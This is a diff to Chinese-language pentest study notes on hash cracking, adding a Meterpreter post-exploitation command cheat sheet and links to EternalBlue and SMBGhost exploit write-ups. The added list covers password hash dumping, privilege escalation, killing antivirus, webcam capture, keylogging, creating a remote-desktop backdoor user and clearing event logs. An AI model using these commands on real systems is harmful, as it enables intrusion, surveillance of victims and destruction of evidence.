@@ -51,9 +51,48 @@ keepass2john newdb.kdb > newdb.kdb.hash
 ```
 rar2john encrypted.rar > encrypted.rar.hash
 ```
+
+>[!ips]
+后渗透阶段:
+在meterpreter > 中我们可以使用以下的命令来实现对目标的操作：
+sysinfo             #查看目标主机系统信息
+run scraper         #查看目标主机详细信息
+hashdump        #导出密码的哈希
+load kiwi           #加载
+ps                  #查看目标主机进程信息
+pwd                 #查看目标当前目录(windows)
+getlwd              #查看目标当前目录(Linux)
+search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件
+download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下
+upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程
+PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上
+idletime            #查看主机运行时间
+getuid              #查看获取的当前权限
+getsystem           #提权
+run  killav         #关闭杀毒软件
+screenshot          #截图
+webcam_list         #查看目标主机的摄像头
+webcam_snap         #拍照
+webcam_stream       #开视频
+execute  参数  -f 可执行文件   #执行可执行程序
+run getgui -u hack -p 123    #创建hack用户，密码为123
+run getgui -e                #开启远程桌面
+keyscan_start                #开启键盘记录功能
+keyscan_dump                 #显示捕捉到的键盘记录信息
+keyscan_stop                 #停止键盘记录功能
+uictl  disable  keyboard     #禁止目标使用键盘
+uictl  enable   keyboard     #允许目标使用键盘
+uictl  disable  mouse        #禁止目标使用鼠标
+uictl  enable   mouse        #允许目标使用鼠标
+load                         #使用扩展库
+run				             #使用扩展库
+clearev                       #清除日志
+
 参考链接
 [使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)
 
 [Windows 用户密码的加密方法与破解 | 国光](https://www.sqlsec.com/2019/11/winhash.html)
-  
-  
+
+[永恒之蓝漏洞复现(ms17-010) - hkgan - 博客园](https://www.cnblogs.com/hkgan/p/17339860.html)
+
+[SMBGhost\_RCE漏洞利用（MSF和CS联动） - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/277707.html)
